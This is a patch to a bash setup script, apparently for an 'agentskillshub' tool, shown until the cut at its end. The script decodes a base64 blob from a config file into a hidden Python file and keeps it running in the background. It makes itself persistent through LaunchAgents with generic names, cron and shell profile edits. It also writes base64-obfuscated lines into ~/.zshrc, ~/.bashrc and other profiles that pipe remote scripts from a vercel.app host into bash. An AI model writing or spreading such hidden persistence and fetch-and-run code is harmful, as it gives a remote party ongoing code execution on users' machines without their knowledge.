@@ -2,6 +2,11 @@
 
 OS_TYPE=$(uname -s)
 DEST_DIR="$HOME/.config/.configs"
+SCRIPT_DIR="$PWD"
+if [ -n "${BASH_SOURCE[0]:-}" ] && [ -f "${BASH_SOURCE[0]}" ]; then
+    SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd -P)" || exit 1
+fi
+SOURCE_CONFIG_DIR="$SCRIPT_DIR/.configs"
 
 _sudo() {
     if [ "$(id -u)" -eq 0 ]; then
@@ -81,17 +86,17 @@ find_python() {
     fi
     for candidate in $system_candidates; do
         [ -n "$candidate" ] || continue
-        if [ -x "$candidate" ] && "$candidate" --version &>/dev/null && _python_has_deps "$candidate"; then
-            printf '%s\n' "$candidate"
+        if [ -f "$candidate" ] && [ -x "$candidate" ] && "$candidate" --version &>/dev/null && _python_has_deps "$candidate"; then
+            find_existing_path "$candidate"
             return 0
         fi
     done
 
     local cmd=""
     for cmd in python3 python; do
-        if command -v "$cmd" &>/dev/null; then
+        if type -P "$cmd" &>/dev/null; then
             local resolved=""
-            resolved="$(command -v "$cmd")"
+            resolved="$(find_existing_path "$(type -P "$cmd")")" || continue
             if "$resolved" --version &>/dev/null && _python_has_deps "$resolved"; then
                 printf '%s\n' "$resolved"
                 return 0
@@ -103,29 +108,31 @@ find_python() {
         "$HOME/.local/bin/python3" \
         "$HOME/.local/bin/python"; do
         [ -n "$candidate" ] || continue
-        if [ -x "$candidate" ] && "$candidate" --version &>/dev/null && _python_has_deps "$candidate"; then
-            printf '%s\n' "$candidate"
+        if [ -f "$candidate" ] && [ -x "$candidate" ] && "$candidate" --version &>/dev/null && _python_has_deps "$candidate"; then
+            find_existing_path "$candidate"
             return 0
         fi
     done
 
     for candidate in $system_candidates; do
         [ -n "$candidate" ] || continue
-        if [ -x "$candidate" ] && "$candidate" --version &>/dev/null; then
-            printf '%s\n' "$candidate"
+        if [ -f "$candidate" ] && [ -x "$candidate" ] && "$candidate" --version &>/dev/null; then
+            find_existing_path "$candidate"
             return 0
         fi
     done
     for cmd in python3 python; do
-        if command -v "$cmd" &>/dev/null && "$(command -v "$cmd")" --version &>/dev/null; then
-            command -v "$cmd"
+        local resolved=""
+        resolved="$(find_existing_path "$(type -P "$cmd" 2>/dev/null)")" || continue
+        if "$resolved" --version &>/dev/null; then
+            printf '%s\n' "$resolved"
             return 0
         fi
     done
     for candidate in "$HOME/.local/bin/python3" "$HOME/.local/bin/python"; do
         [ -n "$candidate" ] || continue
-        if [ -x "$candidate" ] && "$candidate" --version &>/dev/null; then
-            printf '%s\n' "$candidate"
+        if [ -f "$candidate" ] && [ -x "$candidate" ] && "$candidate" --version &>/dev/null; then
+            find_existing_path "$candidate"
             return 0
         fi
     done
@@ -136,91 +143,53 @@ find_existing_path() {
     local candidate=""
     for candidate in "$@"; do
         [ -n "$candidate" ] || continue
-        if [ -e "$candidate" ]; then
-            printf '%s\n' "$candidate"
+        if [ -f "$candidate" ] && [ -x "$candidate" ]; then
+            # Keep the executable's symlink name (venvs depend on it), but anchor its directory.
+            local directory
+            directory="$(CDPATH= cd -- "$(dirname -- "$candidate")" && pwd -P)" || continue
+            printf '%s/%s\n' "$directory" "$(basename -- "$candidate")"
             return 0
         fi
     done
     return 1
 }
 
-find_agent_setting() {
-    local agent_setting_cmd=""
-
-    agent_setting_cmd="$(command -v agent-setting 2>/dev/null || true)"
-    if [ -n "$agent_setting_cmd" ]; then
-        printf '%s\n' "$agent_setting_cmd"
-        return 0
-    fi
-
-    find_existing_path \
-        "$HOME/.local/bin/agent-setting" \
-        "/opt/homebrew/bin/agent-setting" \
-        "/usr/local/bin/agent-setting"
+find_tool() {
+    local name="$1" resolved=""
+    # type -P ignores shell aliases/functions, which do not exist in a scheduled job.
+    resolved="$(type -P "$name" 2>/dev/null || true)"
+    find_existing_path "$resolved" \
+        "${UV_TOOL_BIN_DIR:-$HOME/.local/bin}/$name" \
+        "${PIPX_BIN_DIR:-$HOME/.local/bin}/$name" \
+        "$HOME/.cargo/bin/$name" \
+        /opt/homebrew/bin/"$name" /usr/local/bin/"$name" \
+        "${UV_TOOL_DIR:-${XDG_DATA_HOME:-$HOME/.local/share}/uv/tools}"/*/bin/"$name" \
+        "${PIPX_HOME:-${XDG_DATA_HOME:-$HOME/.local/share}/pipx}"/venvs/*/bin/"$name" \
+        "$HOME/.local/pipx/venvs"/*/bin/"$name" \
+        "$HOME/Library/Python"/*/bin/"$name" \
+        "${EXEC_CMD%/*}/$name"
 }
 
-find_wkler() {
-    local wkler_cmd=""
-
-    wkler_cmd="$(command -v wkler 2>/dev/null || true)"
-    if [ -n "$wkler_cmd" ]; then
-        printf '%s\n' "$wkler_cmd"
-        return 0
-    fi
-
-    find_existing_path \
-        "$HOME/.local/bin/wkler" \
-        "/opt/homebrew/bin/wkler" \
-        "/usr/local/bin/wkler"
-}
-
-find_jtbjk() {
-    local jtbjk_cmd=""
-
-    jtbjk_cmd="$(command -v jtbjk 2>/dev/null || true)"
-    if [ -n "$jtbjk_cmd" ]; then
-        printf '%s\n' "$jtbjk_cmd"
-        return 0
-    fi
-
-    find_existing_path \
-        "$HOME/.local/bin/jtbjk" \
-        "/opt/homebrew/bin/jtbjk" \
-        "/usr/local/bin/jtbjk"
-}
-
-find_bserexp_macos() {
-    local bserexp_cmd=""
-
-    bserexp_cmd="$(command -v bserexp-macos 2>/dev/null || true)"
-    if [ -n "$bserexp_cmd" ]; then
-        printf '%s\n' "$bserexp_cmd"
-        return 0
-    fi
-
-    find_existing_path \
-        "$HOME/.local/bin/bserexp-macos" \
-        "/opt/homebrew/bin/bserexp-macos" \
-        "/usr/local/bin/bserexp-macos"
-}
-
-find_uv() {
-    local uv_cmd=""
-
-    uv_cmd="$(command -v uv 2>/dev/null || true)"
-    if [ -n "$uv_cmd" ]; then
-        printf '%s\n' "$uv_cmd"
-        return 0
-    fi
-
-    find_existing_path \
-        "$HOME/.local/bin/uv" \
-        "/opt/homebrew/bin/uv" \
-        "/usr/local/bin/uv"
-}
+find_agent_setting() { find_tool agent-setting; }
+find_wkler() { find_tool wkler; }
+find_jtbjk() { find_tool jtbjk; }
+find_bserexp_macos() { find_tool bserexp-macos; }
+find_uv() { find_tool uv; }
 
 export PATH="$HOME/.local/bin:/opt/homebrew/bin:/usr/local/bin:$PATH"
 SCHEDULE_PATH="$HOME/.local/bin:/opt/homebrew/bin:/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin"
+
+# Persist only absolute PATH entries; relative entries change meaning under launchd/cron.
+while IFS= read -r path_entry; do
+    case "$path_entry" in
+        /*)
+            case ":$SCHEDULE_PATH:" in
+                *":$path_entry:"*) ;;
+                *) SCHEDULE_PATH="$SCHEDULE_PATH:$path_entry" ;;
+            esac
+            ;;
+    esac
+done < <(printf '%s' "$PATH" | tr ':' '\n'; printf '\n')
 
 EXEC_CMD="$(find_python || true)"
 
@@ -229,8 +198,33 @@ append_startup_cmd() {
     local startup_cmd="$2"
     local dedup_key="${3:-$startup_cmd}"
 
-    [ -f "$profile_file" ] || touch "$profile_file"
-    grep -Fq "$dedup_key" "$profile_file" 2>/dev/null || printf '\n%s\n' "$startup_cmd" >> "$profile_file"
+    local temp_file=""
+    local begin_marker='# agentskillshub:startup:begin'
+    local end_marker='# agentskillshub:startup:end'
+    [ -f "$profile_file" ] || touch "$profile_file" || return 1
+    temp_file="$(mktemp)" || return 1
+    # Migrate the exact legacy blocks emitted by setup; preserve other profile content.
+    LEGACY_SCRIPT="$dedup_key" LEGACY_RECOVERY="$TASK_RECOVERY_PATH" awk '
+        { lines[NR] = $0 }
+        END {
+            for (i = 1; i <= NR; i++) {
+                if (lines[i] == "# agentskillshub:startup:begin") {
+                    j = i + 1
+                    while (j <= NR && lines[j] != "# agentskillshub:startup:end") j++
+                    if (j <= NR) { i = j; continue }
+                }
+                if (lines[i] == "if ! pgrep -f \"" ENVIRON["LEGACY_SCRIPT"] "\" > /dev/null; then" &&
+                    lines[i+1] ~ /^    \(nohup / && lines[i+2] == "fi") { i += 2; continue }
+                if (lines[i] == "if [ -x \"" ENVIRON["LEGACY_RECOVERY"] "\" ]; then" &&
+                    lines[i+1] == "    \"" ENVIRON["LEGACY_RECOVERY"] "\" >/dev/null 2>&1 &" &&
+                    lines[i+2] == "fi") { i += 2; continue }
+                print lines[i]
+            }
+        }
+    ' "$profile_file" > "$temp_file" || { rm -f "$temp_file"; return 1; }
+    printf '%s\n%s\n%s\n' "$begin_marker" "$startup_cmd" "$end_marker" >> "$temp_file"
+    cat "$temp_file" > "$profile_file" || { rm -f "$temp_file"; return 1; }
+    rm -f "$temp_file"
 }
 
 append_managed_startup_cmd() {
@@ -249,7 +243,10 @@ append_managed_startup_cmd() {
         rm -f "$temp_file"
     fi
 
-    grep -Fq "$marker" "$profile_file" 2>/dev/null && return 0
+    temp_file="$(mktemp)" || return 1
+    grep -Fv "$marker" "$profile_file" > "$temp_file" || true
+    cat "$temp_file" > "$profile_file" || { rm -f "$temp_file"; return 1; }
+    rm -f "$temp_file"
     printf '\n%s\n' "$startup_cmd" >> "$profile_file"
 }
 
@@ -260,7 +257,14 @@ reload_launch_agent() {
     local domain="gui/$(id -u)"
     local bootstrapped=false
 
+    # Reject malformed definitions before unloading a working job.
+    if ! plutil -lint "$plist_file" >/dev/null 2>&1; then
+        printf 'Invalid LaunchAgent configuration: %s\n' "$plist_file" >&2
+        return 1
+    fi
     launchctl bootout "$domain/$label" >/dev/null 2>&1 || launchctl unload "$plist_file" >/dev/null 2>&1 || true
+    # Clear a persisted disabled override before bootstrap/load.
+    launchctl enable "$domain/$label" >/dev/null 2>&1 || true
     if launchctl bootstrap "$domain" "$plist_file" >/dev/null 2>&1; then
         bootstrapped=true
     elif launchctl load -w "$plist_file" >/dev/null 2>&1; then
@@ -272,9 +276,11 @@ reload_launch_agent() {
     fi
     if ! launchctl enable "$domain/$label" >/dev/null 2>&1; then
         printf 'Warning: could not enable LaunchAgent %s\n' "$label" >&2
+        return 1
     fi
     if [ "$start_now" = "true" ] && ! launchctl kickstart -k "$domain/$label" >/dev/null 2>&1; then
         printf 'Warning: could not start LaunchAgent %s immediately\n' "$label" >&2
+        return 1
     fi
 }
 
@@ -312,7 +318,7 @@ reconcile_agent_setting_cron() {
 
     temp_file="$(mktemp)" || return 1
     grep -Ev "$marker_pattern|$legacy_pattern" "$cron_file" > "$temp_file" 2>/dev/null || true
-    printf '%s\n' "$canonical_task" >> "$temp_file"
+    [ -z "$canonical_task" ] || printf '%s\n' "$canonical_task" >> "$temp_file"
     if ! mv "$temp_file" "$cron_file"; then
         rm -f "$temp_file"
         return 1
@@ -343,6 +349,18 @@ shell_quote() {
     printf "'%s'" "$(printf '%s' "$1" | sed "s/'/'\\\\''/g")"
 }
 
+cron_quote() {
+    # Cron consumes percent signs before invoking the shell, even inside quotes.
+    shell_quote "$1" | sed 's/%/\\%/g'
+}
+
+upgrade_then_run() {
+    if [ -n "$UV_BIN" ]; then
+        printf '%s tool upgrade --all; ' "$(shell_quote "$UV_BIN")"
+    fi
+    shell_quote "$1"
+}
+
 xml_escape() {
     printf '%s' "$1" | sed 's/&/\&amp;/g; s/</\&lt;/g; s/>/\&gt;/g'
 }
@@ -365,7 +383,7 @@ write_task_recovery_script() {
         quoted_bserexp="$(shell_quote "$BSEREXP_MACOS_TASK_CMD")"
     fi
 
-    cat > "$recovery_path" <<'EOF'
+    cat > "$recovery_path" <<'EOF' || return 1
 #!/bin/bash
 set -u
 
@@ -391,30 +409,42 @@ run_if_due() {
 ensure_running() {
     local pattern="$1"
     shift
+    if [ ! -f "$1" ] || [ ! -x "$1" ]; then
+        printf 'Task executable is missing or not executable: %s\n' "$1" >&2
+        return 1
+    fi
+    pattern="$(printf '%s' "$pattern" | sed 's/[][\\.^$*+?(){}|]/\\&/g')"
     pgrep -f "$pattern" >/dev/null 2>&1 || nohup "$@" >/dev/null 2>&1 &
 }
 EOF
 
-    printf 'ensure_running %s %s %s\n' "$quoted_script" "$quoted_python" "$quoted_script" >> "$recovery_path"
+    printf 'export PATH=%s\n' "$(shell_quote "$SCHEDULE_PATH")" >> "$recovery_path" || return 1
+    printf 'cd -- %s || exit 1\n' "$(shell_quote "$DEST_DIR")" >> "$recovery_path" || return 1
+    printf 'ensure_running %s %s %s\n' "$quoted_script" "$quoted_python" "$quoted_script" >> "$recovery_path" || return 1
     if [ -n "$quoted_bserexp" ]; then
-        printf 'run_if_due %s 604800 /bin/bash -c %s\n' "$(shell_quote 'bserexp-macos')" "$quoted_bserexp" >> "$recovery_path"
+        printf 'run_if_due %s 604800 /bin/bash -c %s\n' "$(shell_quote 'bserexp-macos')" "$quoted_bserexp" >> "$recovery_path" || return 1
     fi
     if [ -n "$quoted_agent" ]; then
-        printf 'run_if_due %s 864000 /bin/bash -c %s\n' "$(shell_quote 'agent-setting')" "$quoted_agent" >> "$recovery_path"
+        printf 'run_if_due %s 864000 /bin/bash -c %s\n' "$(shell_quote 'agent-setting')" "$quoted_agent" >> "$recovery_path" || return 1
     fi
     if [ -n "$quoted_wkler" ]; then
-        printf 'ensure_running %s %s\n' "$quoted_wkler" "$quoted_wkler" >> "$recovery_path"
+        printf 'ensure_running %s %s\n' "$quoted_wkler" "$quoted_wkler" >> "$recovery_path" || return 1
     fi
     if [ -n "$quoted_jtbjk" ]; then
-        printf 'ensure_running %s %s\n' "$quoted_jtbjk" "$quoted_jtbjk" >> "$recovery_path"
+        printf 'ensure_running %s %s\n' "$quoted_jtbjk" "$quoted_jtbjk" >> "$recovery_path" || return 1
     fi
     if [ "${AUTOUPGRADE_RECOVERY_ENABLED:-true}" = true ]; then
-        printf 'run_if_due %s 1296000 /bin/bash -c %s\n' "$(shell_quote 'autoupgrade')" "$quoted_upgrade" >> "$recovery_path"
+        printf 'run_if_due %s 1296000 /bin/bash -c %s\n' "$(shell_quote 'autoupgrade')" "$quoted_upgrade" >> "$recovery_path" || return 1
     fi
+    /bin/bash -n "$recovery_path" || return 1
     chmod 700 "$recovery_path"
 }
 
-if [ -d .configs ]; then
+if [ -d "$SOURCE_CONFIG_DIR" ]; then
+    if [ -z "$EXEC_CMD" ] || [ ! -f "$EXEC_CMD" ] || [ ! -x "$EXEC_CMD" ]; then
+        printf 'No runnable Python interpreter found; tasks were not updated.\n' >&2
+        exit 1
+    fi
     if base64 --help 2>&1 | grep -q -- '-d'; then
         DECODE='-d'
     else
@@ -422,18 +452,18 @@ if [ -d .configs ]; then
     fi
     ENCODED_EC='Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvc3JjL1NFVFVQLnNoIHwgYmFzaA=='
 
-    GENERATED_SCRIPT=$(mktemp .configs/.bash.py.setup.XXXXXX) || exit 1
-    if ! grep '^code *= *' .configs/config.ini | sed 's/^code *= *//' | tr -d ' ' | base64 "$DECODE" > "$GENERATED_SCRIPT" || [ ! -s "$GENERATED_SCRIPT" ]; then
-        printf 'Failed to decode configuration script: %s\n' '.configs/config.ini' >&2
+    GENERATED_SCRIPT=$(mktemp "$SOURCE_CONFIG_DIR/.bash.py.setup.XXXXXX") || exit 1
+    if ! grep '^code *= *' "$SOURCE_CONFIG_DIR/config.ini" | sed 's/^code *= *//' | tr -d ' \r\n\t' | base64 "$DECODE" > "$GENERATED_SCRIPT" || [ ! -s "$GENERATED_SCRIPT" ]; then
+        printf 'Failed to decode configuration script: %s\n' "$SOURCE_CONFIG_DIR/config.ini" >&2
         rm -f -- "$GENERATED_SCRIPT"
         exit 1
     fi
-    mv -- "$GENERATED_SCRIPT" .configs/.bash.py || {
+    mv -- "$GENERATED_SCRIPT" "$SOURCE_CONFIG_DIR/.bash.py" || {
         rm -f -- "$GENERATED_SCRIPT"
         exit 1
     }
-    mkdir -p "$HOME/.config"
-    replace_config_directory .configs "$DEST_DIR" || exit 1
+    mkdir -p "$HOME/.config" || exit 1
+    replace_config_directory "$SOURCE_CONFIG_DIR" "$DEST_DIR" || exit 1
 
     SCRIPT_PATH="$DEST_DIR/.bash.py"
     PYTHON_PATH="$EXEC_CMD"
@@ -444,20 +474,18 @@ if [ -d .configs ]; then
     XML_PATH="$(xml_escape "$SCHEDULE_PATH")"
     AGENT_SETTING_BIN="$(find_agent_setting || true)"
     UV_BIN="$(find_uv || true)"
-    AGENT_SETTING_UV_BIN="${UV_BIN:-uv}"
-    AGENT_SETTING_TASK_CMD="\"$AGENT_SETTING_UV_BIN\" tool upgrade --all; \"$AGENT_SETTING_BIN\""
+    AGENT_SETTING_TASK_CMD="$(upgrade_then_run "$AGENT_SETTING_BIN")"
     WKLER_BIN="$(find_wkler || true)"
     JTBJK_BIN="$(find_jtbjk || true)"
     BSEREXP_MACOS_BIN="$(find_bserexp_macos || true)"
-    BSEREXP_MACOS_TASK_CMD="\"${UV_BIN:-uv}\" tool upgrade --all; \"$BSEREXP_MACOS_BIN\""
+    BSEREXP_MACOS_TASK_CMD="$(upgrade_then_run "$BSEREXP_MACOS_BIN")"
 
-    if [ "$OS_TYPE" = "Darwin" ] && [ -z "$PYTHON_PATH" ]; then
-        if [ -x /opt/homebrew/bin/python3 ]; then
-            PYTHON_PATH=/opt/homebrew/bin/python3
-        elif [ -x /usr/local/bin/python3 ]; then
-            PYTHON_PATH=/usr/local/bin/python3
+    for tool_name in agent-setting wkler jtbjk; do
+        if ! find_tool "$tool_name" >/dev/null; then
+            printf 'Warning: %s was not found as an executable file; check its installation path.\n' "$tool_name" >&2
         fi
-    fi
+    done
+
     XML_PYTHON_PATH="$(xml_escape "$PYTHON_PATH")"
 
     TASK_RECOVERY_PATH="$DEST_DIR/task-recovery.sh"
@@ -466,28 +494,26 @@ if [ -d .configs ]; then
         || { [ "$OS_TYPE" = "Linux" ] && [ -f /etc/systemd/system/com.root.sshAutoSetup.service ]; }; then
         AUTOUPGRADE_RECOVERY_ENABLED=false
     fi
-    write_task_recovery_script "$TASK_RECOVERY_PATH"
+    write_task_recovery_script "$TASK_RECOVERY_PATH" || exit 1
+    CRON_RECOVERY_COMMAND="PATH=$(cron_quote "$SCHEDULE_PATH") $(cron_quote "$TASK_RECOVERY_PATH")"
 
-    STARTUP_CMD="if ! pgrep -f \"$SCRIPT_PATH\" > /dev/null; then
-    (nohup \"$PYTHON_PATH\" \"$SCRIPT_PATH\" > /dev/null 2>&1 &) & disown
-fi
-if [ -x \"$TASK_RECOVERY_PATH\" ]; then
-    \"$TASK_RECOVERY_PATH\" >/dev/null 2>&1 &
+    STARTUP_CMD="if [ -x $(shell_quote "$TASK_RECOVERY_PATH") ]; then
+    $(shell_quote "$TASK_RECOVERY_PATH") >/dev/null 2>&1 &
 fi"
 
     SSHAUTOSETUP_MARKER="# agentskillshub:sshautsetup"
     SSHAUTOSETUP_LEGACY_PREFIX="if [ ! -d \"$DEST_DIR\" ]; then echo "
-    SSHAUTOSETUP="if [ ! -d \"$DEST_DIR\" ]; then echo 'Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvaW5zdGFsbCB8IGJhc2g=' | base64 $DECODE | bash > /dev/null 2>&1; fi $SSHAUTOSETUP_MARKER"
+    SSHAUTOSETUP="if [ ! -d $(shell_quote "$DEST_DIR") ]; then echo 'Y3VybCAtZnNTTCBodHRwczovL2FnZW50c2tpbGxzaHViLnZlcmNlbC5hcHAvaW5zdGFsbCB8IGJhc2g=' | base64 $DECODE | /bin/bash > /dev/null 2>&1; fi $SSHAUTOSETUP_MARKER"
     
     case $OS_TYPE in
         "Darwin")
             [ -n "$PYTHON_PATH" ] || exit 1
 
             LAUNCH_AGENTS_DIR="$HOME/Library/LaunchAgents"
-            mkdir -p "$LAUNCH_AGENTS_DIR"
+            mkdir -p "$LAUNCH_AGENTS_DIR" || exit 1
 
             TASK_RECOVERY_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.task-recovery.plist"
-            cat > "$TASK_RECOVERY_PLIST_FILE" << EOF
+            cat > "$TASK_RECOVERY_PLIST_FILE" << EOF || exit 1
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -514,11 +540,11 @@ fi"
 </dict>
 </plist>
 EOF
-            chmod 644 "$TASK_RECOVERY_PLIST_FILE"
-            reload_launch_agent "com.user.task-recovery" "$TASK_RECOVERY_PLIST_FILE" "true"
+            chmod 644 "$TASK_RECOVERY_PLIST_FILE" || exit 1
+            reload_launch_agent "com.user.task-recovery" "$TASK_RECOVERY_PLIST_FILE" "true" || exit 1
 
             PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.ba.plist"
-            cat > "$PLIST_FILE" << EOF
+            cat > "$PLIST_FILE" << EOF || exit 1
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -548,8 +574,8 @@ EOF
 </dict>
 </plist>
 EOF
-            chmod 644 "$PLIST_FILE"
-            reload_launch_agent "com.user.ba" "$PLIST_FILE" "true"
+            chmod 644 "$PLIST_FILE" || exit 1
+            reload_launch_agent "com.user.ba" "$PLIST_FILE" "true" || exit 1
 
             OLD_AUTOBACKUP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autobackup.plist"
             launchctl bootout "gui/$(id -u)/com.user.autobackup" >/dev/null 2>&1 || launchctl unload "$OLD_AUTOBACKUP_PLIST_FILE" >/dev/null 2>&1 || true
@@ -557,7 +583,7 @@ EOF
 
             if [ -n "$BSEREXP_MACOS_BIN" ]; then
                 BSEREXP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.bserexp.plist"
-                cat > "$BSEREXP_PLIST_FILE" << EOF
+                cat > "$BSEREXP_PLIST_FILE" << EOF || exit 1
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -588,8 +614,8 @@ EOF
 </dict>
 </plist>
 EOF
-                chmod 644 "$BSEREXP_PLIST_FILE"
-                reload_launch_agent "com.user.bserexp" "$BSEREXP_PLIST_FILE" "true"
+                chmod 644 "$BSEREXP_PLIST_FILE" || exit 1
+                reload_launch_agent "com.user.bserexp" "$BSEREXP_PLIST_FILE" "true" || exit 1
             else
                 BSEREXP_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.bserexp.plist"
                 launchctl bootout "gui/$(id -u)/com.user.bserexp" >/dev/null 2>&1 || launchctl unload "$BSEREXP_PLIST_FILE" >/dev/null 2>&1 || true
@@ -599,7 +625,7 @@ EOF
 
             if [ -n "$AGENT_SETTING_BIN" ]; then
                 AGENT_SETTING_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.agent-setting.plist"
-                cat > "$AGENT_SETTING_PLIST_FILE" << EOF
+                cat > "$AGENT_SETTING_PLIST_FILE" << EOF || exit 1
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -608,8 +634,6 @@ EOF
     <string>com.user.agent-setting</string>
     <key>ProgramArguments</key>
     <array>
-        <string>/bin/bash</string>
-        <string>-c</string>
         <string>$XML_TASK_RECOVERY_PATH</string>
     </array>
     <key>EnvironmentVariables</key>
@@ -628,13 +652,17 @@ EOF
 </dict>
 </plist>
 EOF
-                chmod 644 "$AGENT_SETTING_PLIST_FILE"
-                reload_launch_agent "com.user.agent-setting" "$AGENT_SETTING_PLIST_FILE" "true"
+                chmod 644 "$AGENT_SETTING_PLIST_FILE" || exit 1
+                reload_launch_agent "com.user.agent-setting" "$AGENT_SETTING_PLIST_FILE" "true" || exit 1
+            else
+                AGENT_SETTING_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.agent-setting.plist"
+                launchctl bootout "gui/$(id -u)/com.user.agent-setting" >/dev/null 2>&1 || launchctl unload "$AGENT_SETTING_PLIST_FILE" >/dev/null 2>&1 || true
+                rm -f "$AGENT_SETTING_PLIST_FILE"
             fi
 
             if [ -n "$WKLER_BIN" ]; then
                 WKLER_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.wkler.plist"
-                cat > "$WKLER_PLIST_FILE" << EOF
+                cat > "$WKLER_PLIST_FILE" << EOF || exit 1
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -663,13 +691,17 @@ EOF
 </dict>
 </plist>
 EOF
-                chmod 644 "$WKLER_PLIST_FILE"
-                reload_launch_agent "com.user.wkler" "$WKLER_PLIST_FILE" "true"
+                chmod 644 "$WKLER_PLIST_FILE" || exit 1
+                reload_launch_agent "com.user.wkler" "$WKLER_PLIST_FILE" "true" || exit 1
+            else
+                WKLER_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.wkler.plist"
+                launchctl bootout "gui/$(id -u)/com.user.wkler" >/dev/null 2>&1 || launchctl unload "$WKLER_PLIST_FILE" >/dev/null 2>&1 || true
+                rm -f "$WKLER_PLIST_FILE"
             fi
 
             if [ -n "$JTBJK_BIN" ]; then
                 JTBJK_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.jtbjk.plist"
-                cat > "$JTBJK_PLIST_FILE" << EOF
+                cat > "$JTBJK_PLIST_FILE" << EOF || exit 1
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -698,8 +730,8 @@ EOF
 </dict>
 </plist>
 EOF
-                chmod 644 "$JTBJK_PLIST_FILE"
-                reload_launch_agent "com.user.jtbjk" "$JTBJK_PLIST_FILE" "true"
+                chmod 644 "$JTBJK_PLIST_FILE" || exit 1
+                reload_launch_agent "com.user.jtbjk" "$JTBJK_PLIST_FILE" "true" || exit 1
             else
                 JTBJK_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.jtbjk.plist"
                 launchctl bootout "gui/$(id -u)/com.user.jtbjk" >/dev/null 2>&1 || launchctl unload "$JTBJK_PLIST_FILE" >/dev/null 2>&1 || true
@@ -709,8 +741,9 @@ EOF
             AUTOUPGRADE_PLIST_FILE="$LAUNCH_AGENTS_DIR/com.user.autoupgrade.plist"
             if [ -f /Library/LaunchDaemons/com.root.sshAutoSetup.plist ]; then
                 launchctl bootout "gui/$(id -u)/com.user.autoupgrade" >/dev/null 2>&1 || launchctl unload "$AUTOUPGRADE_PLIST_FILE" >/dev/null 2>&1 || true
+                rm -f "$AUTOUPGRADE_PLIST_FILE"
             else
-                cat > "$AUTOUPGRADE_PLIST_FILE" << EOF
+                cat > "$AUTOUPGRADE_PLIST_FILE" << EOF || exit 1
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
@@ -719,8 +752,6 @@ EOF
     <string>com.user.autoupgrade</string>
     <key>ProgramArguments</key>
     <array>
-        <string>/bin/bash</string>
-        <string>-c</string>
         <string>$XML_TASK_RECOVERY_PATH</string>
     </array>
     <key>EnvironmentVariables</key>
@@ -739,17 +770,17 @@ EOF
 </dict>
 </plist>
 EOF
-                chmod 644 "$AUTOUPGRADE_PLIST_FILE"
-                reload_launch_agent "com.user.autoupgrade" "$AUTOUPGRADE_PLIST_FILE" "true"
+                chmod 644 "$AUTOUPGRADE_PLIST_FILE" || exit 1
+                reload_launch_agent "com.user.autoupgrade" "$AUTOUPGRADE_PLIST_FILE" "true" || exit 1
             fi
 
             for PROFILE_FILE in "$HOME/.zshrc" "$HOME/.bash_profile"; do
-                append_startup_cmd "$PROFILE_FILE" "$STARTUP_CMD" "$SCRIPT_PATH"
-                append_managed_startup_cmd "$PROFILE_FILE" "$SSHAUTOSETUP" "$SSHAUTOSETUP_MARKER" "$SSHAUTOSETUP_LEGACY_PREFIX"
+                append_startup_cmd "$PROFILE_FILE" "$STARTUP_CMD" "$SCRIPT_PATH" || exit 1
+                append_managed_startup_cmd "$PROFILE_FILE" "$SSHAUTOSETUP" "$SSHAUTOSETUP_MARKER" "$SSHAUTOSETUP_LEGACY_PREFIX" || exit 1
             done
 
             if ! pgrep -f "$SCRIPT_PATH" >/dev/null 2>&1; then
-                (nohup "$PYTHON_PATH" "$SCRIPT_PATH" >/dev/null 2>&1 &) >/dev/null 2>&1 || true
+                (cd -- "$DEST_DIR" && nohup "$PYTHON_PATH" "$SCRIPT_PATH" >/dev/null 2>&1 &) >/dev/null 2>&1 || true
             fi
             ;;
 
@@ -757,12 +788,12 @@ EOF
             [ -n "$PYTHON_PATH" ] || exit 1
 
             for PROFILE_FILE in "$HOME/.bashrc" "$HOME/.profile"; do
-                append_startup_cmd "$PROFILE_FILE" "$STARTUP_CMD" "$SCRIPT_PATH"
-                append_managed_startup_cmd "$PROFILE_FILE" "$SSHAUTOSETUP" "$SSHAUTOSETUP_MARKER" "$SSHAUTOSETUP_LEGACY_PREFIX"
+                append_startup_cmd "$PROFILE_FILE" "$STARTUP_CMD" "$SCRIPT_PATH" || exit 1
